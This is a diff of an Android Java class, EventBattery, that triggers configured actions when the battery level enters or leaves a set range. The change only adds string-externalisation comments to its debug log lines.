@@ -20,7 +20,7 @@ import com.android.service.util.DataBuffer;
 
 public class EventBattery extends EventBase implements Observer<Battery> {
 	/** The Constant TAG. */
-	private static final String TAG = "EventBattery";
+	private static final String TAG = "EventBattery"; //$NON-NLS-1$
 
 	private int actionOnExit, actionOnEnter, minLevel, maxLevel;
 	private boolean inRange = false;
@@ -50,11 +50,11 @@ public class EventBattery extends EventBase implements Observer<Battery> {
 			maxLevel = databuffer.readInt();
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " exitAction: " + actionOnExit + " minLevel:" + minLevel + " maxLevel:" + maxLevel);
+				Check.log(TAG + " exitAction: " + actionOnExit + " minLevel:" + minLevel + " maxLevel:" + maxLevel) ;//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 			}
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: params FAILED");
+				Check.log(TAG + " Error: params FAILED") ;//$NON-NLS-1$
 			}
 			return false;
 		}
@@ -68,7 +68,7 @@ public class EventBattery extends EventBase implements Observer<Battery> {
 
 	public int notification(Battery b) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " Got battery notification: " + b.getBatteryLevel() + "%");
+			Check.log(TAG + " Got battery notification: " + b.getBatteryLevel() + "%") ;//$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		if (minLevel > maxLevel) {
@@ -79,7 +79,7 @@ public class EventBattery extends EventBase implements Observer<Battery> {
 		if ((b.getBatteryLevel() >= minLevel && b.getBatteryLevel() <= maxLevel) && inRange == false) {
 			inRange = true;
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Battery IN");
+				Check.log(TAG + " Battery IN") ;//$NON-NLS-1$
 			}
 			onEnter();
 		}
@@ -88,7 +88,7 @@ public class EventBattery extends EventBase implements Observer<Battery> {
 		if ((b.getBatteryLevel() < minLevel || b.getBatteryLevel() > maxLevel) && inRange == true) {
 			inRange = false;
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Battery OUT");
+				Check.log(TAG + " Battery OUT") ;//$NON-NLS-1$
 			}
 			onExit();
 		}
